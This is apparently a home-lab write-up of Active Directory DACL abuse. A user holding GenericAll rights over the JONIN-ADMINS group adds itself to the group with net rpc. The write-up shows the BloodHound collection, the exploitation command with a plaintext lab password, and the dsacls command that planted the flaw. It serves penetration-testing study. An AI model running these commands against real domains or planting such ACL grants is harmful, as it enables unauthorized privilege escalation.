User Own Generic ALL Right For Domain Admin Group


DACL

Abuse (GenericAll on Group)

  1. 1.

    1. Hypothesis & Vulnerability Identification

Hypothesis: During the post-exploitation analysis of Active Directory permissions, we hypothesized that the compromised user kaneki_ghoul25 might possess "Ghost Privileges" hidden Access Control Entries (ACEs) that grant excessive rights over other objects.

Findings: Utilizing BloodHound to visualize the permission structure, we identified a critical misconfiguration: kaneki_ghoul25 holds GenericAll rights over the JONIN-ADMINS security group.

Impact: GenericAll is equivalent to "Full Control." It allows the user to modify group membership, effectively enabling kaneki_ghoul25 to add themselves to the JONIN-ADMINS group and inherit all privileges associated with that role.

  1. 2.

    2. Data Collection (Ingestion)

Objective: Before executing the attack, we refreshed the domain dataset to ensure our attack path was based on current permission states.

Execution: Ran the bloodhound-python ingestor from the attacker machine.

bloodhound-python -u kaneki_ghoul25 -p

'TokyoGhoul#1'

-ns 192.168.56.10 -d shinobi.local -c All

  1. 3.

    3. Pre-Attack Verification

Objective: Confirm the current membership of the target group (JONIN-ADMINS) to verify that our compromised user is not already a member and to baseline the group state.

Execution:

net rpc group members

"JONIN-ADMINS"

-U shinobi.local/kaneki_ghoul25%

'TokyoGhoul#1'

 -S 192.168.56.10

  1. 4.

    4. Exploitation: Self-Membership Addition

Objective: Abuse the GenericAll permission to force-add kaneki_ghoul25 to the JONIN-ADMINS group.

Technique: We utilized net rpc, a tool that interacts with the SAMR (Security Account Manager Remote) pipe, to execute the membership change remotely.

Command:

net rpc group addmem

"JONIN-ADMINS"

"kaneki_ghoul25"

 -U shinobi.local/kaneki_ghoul25%

'TokyoGhoul#1'

 -S 192.168.56.10

Result: The command executed successfully. A subsequent check confirmed that kaneki_ghoul25 is now a member of JONIN-ADMINS, successfully escalating privileges to the "Jonin" tier.

  1. 5.

    5. Vulnerability Configuration (Lab Setup)

Objective: To simulate a realistic "Insider Threat" or "Misconfiguration" scenario, we intentionally modified the Discretionary Access Control List (DACL) of the target group. This step created the specific security flaw (GenericAll) required to execute the privilege escalation attack.

  • Tool Used: dsacls.exe (Domain Security Access Control Lists) on the Domain Controller.

  • Command Logic: We assigned the GenericAll (GA) permission to the user kaneki_ghoul25 for the object JONIN-ADMINS.

Execution Command:

dsacls "CN=JONIN-ADMINS,CN=Users,DC=shinobi,DC=local" /G shinobi\kaneki_ghoul25:GA

  • CN=JONIN-ADMINS...: The Distinguished Name (DN) of the target group.

  • shinobi\kaneki_ghoul25: The user receiving the rights.

  • /G ... :GA: Grants (G) the GenericAll permission.

Validation Command: To verify the ACL was applied correctly before starting the attack, we listed the permissions:

PowerShell

dsacls "CN=JONIN-ADMINS,CN=Users,DC=shinobi,DC=local"
